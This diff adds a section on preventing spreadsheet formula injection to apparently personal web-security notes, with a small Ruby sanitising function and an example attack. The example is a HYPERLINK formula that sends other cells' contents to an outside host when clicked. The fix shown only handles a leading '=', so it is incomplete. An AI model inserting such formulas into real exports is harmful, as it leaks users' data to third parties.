@@ -4,6 +4,28 @@ tools
 * http://chrispederick.com/work/web-developer/  inspect cookies
 * https://addons.mozilla.org/en-US/firefox/addon/export-cookies export cookies so you can use them with `wget` or `curl`
 
+
+# Spreadsheet Formula Injection prevention
+
+to protect replace `=` with `'=` 
+
+This will display a black cell when first downloaded, with a security bar at the top of
+excel document allowing users to enable editing if they trust the file
+
+```
+  def secure_xls_cell(cell_value)
+    cell_value[0] = "'=" if cell_value[0] == '='
+    cell_value
+  end
+```
+
+example of attack
+
+```
+=HYPERLINK("http://contextis.co.uk?leak="&B1&B2, "Error: please click for further
+information")
+```
+
 # antivirus
 
 you can use cloud API solutions like [Scanii](https://scanii.com/) which can directly pull from S3, or implement solution where you would have antivirus VM that would pull list of files from app and then pull files from S3 and POST to your app resoult
